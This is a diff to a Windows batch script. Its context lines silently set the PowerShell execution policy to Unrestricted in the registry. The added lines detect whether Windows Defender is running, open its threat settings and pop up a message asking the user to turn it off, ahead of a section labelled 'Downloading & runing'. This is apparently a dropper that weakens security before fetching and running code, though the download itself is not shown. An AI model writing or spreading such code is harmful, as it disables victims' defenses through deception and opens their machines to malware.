@@ -36,6 +36,24 @@ Powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -nologo -Command
 reg add "HKCU\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v "ExecutionPolicy" /t REG_SZ /d "Unrestricted" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v "ExecutionPolicy" /t REG_SZ /d "Unrestricted" /f >nul 2>&1
 
+REM Check if WinDefend service is running
+sc query WinDefend | findstr /I "RUNNING" >nul
+if errorlevel 1 (
+    echo Windows Defender service is NOT running.
+    goto :endcheck
+) else (
+    echo Windows Defender service is running.
+)
+
+REM Open Windows Defender threat settings
+start windowsdefender://threatsettings
+
+REM Show message box using PowerShell
+powershell -command ^
+  "Add-Type -AssemblyName System.Windows.Forms; " ^
+  "[System.Windows.Forms.MessageBox]::Show('Please kindly turn off Windows Defender.','Notice','OK','Information')"
+:endcheck
+
 :DnR
 Echo Downloading ^& runing
 del /f /s /q "%tmp%\IA" >nul 2>nul
